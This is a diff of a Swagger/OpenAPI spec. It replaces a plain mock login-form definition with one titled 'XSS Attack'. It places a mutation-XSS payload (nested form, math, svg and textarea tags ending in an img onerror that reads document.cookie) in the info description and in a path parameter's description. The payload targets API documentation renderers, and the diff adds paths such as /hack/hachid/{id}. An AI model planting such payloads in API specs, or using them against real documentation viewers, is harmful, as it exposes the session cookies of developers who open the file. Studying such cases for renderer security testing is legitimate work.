@@ -1,22 +1,38 @@
 swagger: '2.0'
 info:
-  title: Basic Login Form
-  version: 1.0.0
-  description: Serves a safe, plain HTML login form
-
+  title: XSS Attack 
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
 paths:
-  /test:
+  /M0X0101:
     get:
-      summary: Simple login
-      produces: [text/html]
       responses:
-        200:
-          description: Login form
-          x-amazon-apigateway-integration:
-            type: mock
-            responses:
-              default:
-                statusCode: "200"
-                responseTemplates:
-                  text/html: |
-                    <!DOCTYPE html><title>Login</title><h2>Login</h2><form method=post><p>Username: <input name=username required></p><p>Password: <input type=password name=password required></p><p><input type=submit value=Login></p></form>
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
